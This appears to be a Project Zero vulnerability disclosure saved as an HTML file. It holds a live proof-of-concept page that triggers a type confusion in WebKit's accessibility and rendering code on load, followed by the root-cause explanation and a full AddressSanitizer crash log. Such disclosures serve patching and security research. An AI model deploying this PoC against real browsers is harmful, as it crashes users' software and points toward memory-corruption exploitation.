@@ -1,0 +1,144 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1038
+
+There is a type confusion vulnerability that affects WebKit with accessibility enabled (WebCore::AXObjectCache::gAccessibilityEnabed).
+
+PoC:
+
+===============================
+-->
+
+<script>
+function boom() {
+  m.append("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
+  m.setAttribute("aria-labeledby", "t");
+  d.open = false;
+}
+</script>
+<body onload=boom()>
+<title id="t">foo</title>
+<menu id="m">
+<details id="d" open="true">
+
+<!--
+===============================
+
+
+Bad cast happens in RenderBox.h in
+
+inline RenderBox* RenderBox::firstChildBox() const
+{
+  return downcast<RenderBox>(firstChild());
+}
+
+The function expects that the first child is going to be of type RenderBox, but in the PoC it is actually of type RenderText.
+
+This was tested on WebKitGTK+ 2.14.2 (latest stable version at this time). The PoC also crashes Safari on Mac, but only if the PoC is run while the Web Inspector / Error Console are enabled. It appears this behavior is caused by the fact that opening inspector enables accessibility features (via a call to AXObjectCache::enableAccessibility), while accessibility features are enabled in WebKitGTK+ by default through WebPageAccessibilityObjectAtk.
+
+ASAN log follows.
+
+=================================================================
+==5530==ERROR: AddressSanitizer: global-buffer-overflow on address 0x7fd724fdca78 at pc 0x7fd72289499f bp 0x7ffc9e7a40b0 sp 0x7ffc9e7a40a8
+READ of size 8 at 0x7fd724fdca78 thread T0
+    #0 0x7fd72289499e in WebCore::RenderBox::computeBlockDirectionMargins(WebCore::RenderBlock const&, WebCore::LayoutUnit&, WebCore::LayoutUnit&) const /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBox.cpp:3260:21
+    #1 0x7fd7228a00b1 in WebCore::RenderBox::computeAndSetBlockDirectionMargins(WebCore::RenderBlock const&) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBox.cpp:3270:5
+    #2 0x7fd7227faa45 in WebCore::RenderBlockFlow::layoutBlockChild(WebCore::RenderBox&, WebCore::RenderBlockFlow::MarginInfo&, WebCore::LayoutUnit&, WebCore::LayoutUnit&) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlockFlow.cpp:660:5
+    #3 0x7fd7227f6abe in WebCore::RenderBlockFlow::layoutBlockChildren(bool, WebCore::LayoutUnit&) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlockFlow.cpp:632:9
+    #4 0x7fd7227f2d55 in WebCore::RenderBlockFlow::layoutBlock(bool, WebCore::LayoutUnit) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlockFlow.cpp:487:9
+    #5 0x7fd7227a24b7 in WebCore::RenderBlock::layout() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlock.cpp:1075:5
+    #6 0x7fd7227fb3a0 in WebCore::RenderBlockFlow::layoutBlockChild(WebCore::RenderBox&, WebCore::RenderBlockFlow::MarginInfo&, WebCore::LayoutUnit&, WebCore::LayoutUnit&) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlockFlow.cpp:709:9
+    #7 0x7fd7227f6abe in WebCore::RenderBlockFlow::layoutBlockChildren(bool, WebCore::LayoutUnit&) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlockFlow.cpp:632:9
+    #8 0x7fd7227f2d55 in WebCore::RenderBlockFlow::layoutBlock(bool, WebCore::LayoutUnit) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlockFlow.cpp:487:9
+    #9 0x7fd7227a24b7 in WebCore::RenderBlock::layout() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlock.cpp:1075:5
+    #10 0x7fd7227fb3a0 in WebCore::RenderBlockFlow::layoutBlockChild(WebCore::RenderBox&, WebCore::RenderBlockFlow::MarginInfo&, WebCore::LayoutUnit&, WebCore::LayoutUnit&) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlockFlow.cpp:709:9
+    #11 0x7fd7227f6abe in WebCore::RenderBlockFlow::layoutBlockChildren(bool, WebCore::LayoutUnit&) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlockFlow.cpp:632:9
+    #12 0x7fd7227f2d55 in WebCore::RenderBlockFlow::layoutBlock(bool, WebCore::LayoutUnit) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlockFlow.cpp:487:9
+    #13 0x7fd7227a24b7 in WebCore::RenderBlock::layout() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlock.cpp:1075:5
+    #14 0x7fd7227fb3a0 in WebCore::RenderBlockFlow::layoutBlockChild(WebCore::RenderBox&, WebCore::RenderBlockFlow::MarginInfo&, WebCore::LayoutUnit&, WebCore::LayoutUnit&) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlockFlow.cpp:709:9
+    #15 0x7fd7227f6abe in WebCore::RenderBlockFlow::layoutBlockChildren(bool, WebCore::LayoutUnit&) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlockFlow.cpp:632:9
+    #16 0x7fd7227f2d55 in WebCore::RenderBlockFlow::layoutBlock(bool, WebCore::LayoutUnit) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlockFlow.cpp:487:9
+    #17 0x7fd7227a24b7 in WebCore::RenderBlock::layout() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlock.cpp:1075:5
+    #18 0x7fd722c7d92f in WebCore::RenderView::layoutContent(WebCore::LayoutState const&) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderView.cpp:244:5
+    #19 0x7fd722c7ee64 in WebCore::RenderView::layout() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderView.cpp:370:9
+    #20 0x7fd72221b17b in WebCore::FrameView::layout(bool) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/page/FrameView.cpp:1438:9
+    #21 0x7fd721495fe2 in WebCore::Document::updateLayout() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/dom/Document.cpp:2007:9
+    #22 0x7fd7214a2801 in WebCore::Document::updateLayoutIgnorePendingStylesheets(WebCore::Document::RunPostLayoutTasks) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/dom/Document.cpp:2039:5
+    #23 0x7fd721579993 in WebCore::Element::innerText() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/dom/Element.cpp:2518:5
+    #24 0x7fd720c6d821 in WebCore::accessibleNameForNode(WebCore::Node*, WebCore::Node*) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/accessibility/AccessibilityNodeObject.cpp:1887:16
+    #25 0x7fd720c7695c in WebCore::AccessibilityNodeObject::accessibilityDescriptionForElements(WTF::Vector<WebCore::Element*, 0ul, WTF::CrashOnOverflow, 16ul>&) const /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/accessibility/AccessibilityNodeObject.cpp:1930:44
+    #26 0x7fd720c77102 in WebCore::AccessibilityNodeObject::ariaLabeledByAttribute() const /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/accessibility/AccessibilityNodeObject.cpp:1955:12
+    #27 0x7fd720c773e9 in WebCore::AccessibilityNodeObject::ariaAccessibilityDescription() const /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/accessibility/AccessibilityNodeObject.cpp:1166:28
+    #28 0x7fd720c773e9 in WebCore::AccessibilityNodeObject::hasAttributesRequiredForInclusion() const /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/accessibility/AccessibilityNodeObject.cpp:1963
+    #29 0x7fd720cc408b in WebCore::AccessibilityRenderObject::computeAccessibilityIsIgnored() const /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/accessibility/AccessibilityRenderObject.cpp:1356:9
+    #30 0x7fd720cac82c in WebCore::AccessibilityObject::accessibilityIsIgnored() const /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/accessibility/AccessibilityObject.cpp:2978:19
+    #31 0x7fd720cab793 in WebCore::AccessibilityObject::notifyIfIgnoredValueChanged() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/accessibility/AccessibilityObject.cpp:2870:22
+    #32 0x7fd72279df02 in WebCore::RenderBlock::makeChildrenNonInline(WebCore::RenderObject*) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlock.cpp:707:5
+    #33 0x7fd72279d37a in WebCore::RenderBlock::addChildIgnoringContinuation(WebCore::RenderObject*, WebCore::RenderObject*) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBlock.cpp:606:9
+    #34 0x7fd722eb34fa in WebCore::RenderTreePosition::insert(WebCore::RenderObject&) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/style/RenderTreePosition.h:93:5
+    #35 0x7fd722eb34fa in WebCore::RenderTreeUpdater::createRenderer(WebCore::Element&, WebCore::RenderStyle&&) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/style/RenderTreeUpdater.cpp:370
+    #36 0x7fd722eaec96 in WebCore::RenderTreeUpdater::updateElementRenderer(WebCore::Element&, WebCore::Style::ElementUpdate&) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/style/RenderTreeUpdater.cpp:283:9
+    #37 0x7fd722eac9ad in WebCore::RenderTreeUpdater::updateRenderTree(WebCore::ContainerNode&) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/style/RenderTreeUpdater.cpp:173:9
+    #38 0x7fd722eabdcf in WebCore::RenderTreeUpdater::commit(std::unique_ptr<WebCore::Style::Update, std::default_delete<WebCore::Style::Update> >) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/style/RenderTreeUpdater.cpp:120:9
+    #39 0x7fd7214a045e in WebCore::Document::recalcStyle(WebCore::Style::Change) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/dom/Document.cpp:1936:13
+    #40 0x7fd7214a1a4f in WebCore::Document::updateStyleIfNeeded() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/dom/Document.cpp:1982:5
+    #41 0x7fd7214a1a4f in WebCore::Document::implicitClose() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/dom/Document.cpp:2807
+    #42 0x7fd721f666e8 in WebCore::FrameLoader::checkCallImplicitClose() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/loader/FrameLoader.cpp:870:5
+    #43 0x7fd721f666e8 in WebCore::FrameLoader::checkCompleted() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/loader/FrameLoader.cpp:816
+    #44 0x7fd721f6101a in WebCore::FrameLoader::finishedParsing() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/loader/FrameLoader.cpp:737:5
+    #45 0x7fd7214da906 in WebCore::Document::finishedParsing() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/dom/Document.cpp:5228:9
+    #46 0x7fd721c66aca in WebCore::HTMLDocumentParser::end() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/html/parser/HTMLDocumentParser.cpp:406:5
+    #47 0x7fd721c66aca in WebCore::HTMLDocumentParser::attemptToRunDeferredScriptsAndEnd() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/html/parser/HTMLDocumentParser.cpp:415
+    #48 0x7fd721c66aca in WebCore::HTMLDocumentParser::prepareToStopParsing() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/html/parser/HTMLDocumentParser.cpp:135
+    #49 0x7fd721f480d3 in WebCore::DocumentWriter::end() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/loader/DocumentWriter.cpp:269:5
+    #50 0x7fd721f20e29 in WebCore::DocumentLoader::finishedLoading(double) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/loader/DocumentLoader.cpp:442:5
+    #51 0x7fd721f2a031 in WebCore::DocumentLoader::continueAfterContentPolicy(WebCore::PolicyAction) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/loader/DocumentLoader.cpp:829:13
+    #52 0x7fd721f25361 in WebCore::DocumentLoader::responseReceived(WebCore::CachedResource*, WebCore::ResourceResponse const&) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/loader/DocumentLoader.cpp:711:9
+    #53 0x7fd721f1b2a9 in WebCore::DocumentLoader::handleSubstituteDataLoadNow() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/loader/DocumentLoader.cpp:477:5
+    #54 0x7fd722434521 in WebCore::ThreadTimers::sharedTimerFiredInternal() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/platform/ThreadTimers.cpp:121:9
+    #55 0x7fd71f10ff1b in WTF::RunLoop::TimerBase::TimerBase(WTF::RunLoop&)::$_3::operator()(void*) const /home/ifratric/webkit/webkitgtk-2.14.2/Source/WTF/wtf/glib/RunLoopGLib.cpp:162:9
+    #56 0x7fd71f10ff1b in WTF::RunLoop::TimerBase::TimerBase(WTF::RunLoop&)::$_3::__invoke(void*) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WTF/wtf/glib/RunLoopGLib.cpp:160
+    #57 0x7fd717fcf059 in g_main_context_dispatch (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x4a059)
+    #58 0x7fd717fcf3ff  (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x4a3ff)
+    #59 0x7fd717fcf721 in g_main_loop_run (/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x4a721)
+    #60 0x7fd71f10f384 in WTF::RunLoop::run() /home/ifratric/webkit/webkitgtk-2.14.2/Source/WTF/wtf/glib/RunLoopGLib.cpp:94:9
+    #61 0x7fd7208b6f98 in int WebKit::ChildProcessMain<WebKit::WebProcess, WebKit::WebProcessMain>(int, char**) /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebKit2/Shared/unix/ChildProcessMain.h:61:5
+    #62 0x7fd71378b82f in __libc_start_main /build/glibc-GKVZIf/glibc-2.23/csu/../csu/libc-start.c:291
+    #63 0x41a218 in _start (/webkit/libexec/webkit2gtk-4.0/WebKitWebProcess+0x41a218)
+
+0x7fd724fdca78 is located 272 bytes to the right of global variable 'vtable for WebCore::RenderText' defined in '/home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderText.cpp' (0x7fd724fdc400) of size 1384
+SUMMARY: AddressSanitizer: global-buffer-overflow /home/ifratric/webkit/webkitgtk-2.14.2/Source/WebCore/rendering/RenderBox.cpp:3260:21 in WebCore::RenderBox::computeBlockDirectionMargins(WebCore::RenderBlock const&, WebCore::LayoutUnit&, WebCore::LayoutUnit&) const
+Shadow bytes around the buggy address:
+  0x0ffb649f38f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0ffb649f3900: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0ffb649f3910: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0ffb649f3920: 00 00 00 00 00 00 00 00 00 00 00 00 00 f9 f9 f9
+  0x0ffb649f3930: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
+=>0x0ffb649f3940: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9[f9]
+  0x0ffb649f3950: f9 f9 f9 f9 f9 f9 f9 f9 00 00 00 00 00 00 f9 f9
+  0x0ffb649f3960: f9 f9 f9 f9 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0ffb649f3970: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0ffb649f3980: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x0ffb649f3990: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Heap right redzone:      fb
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack partial redzone:   f4
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+==5530==ABORTING
+-->
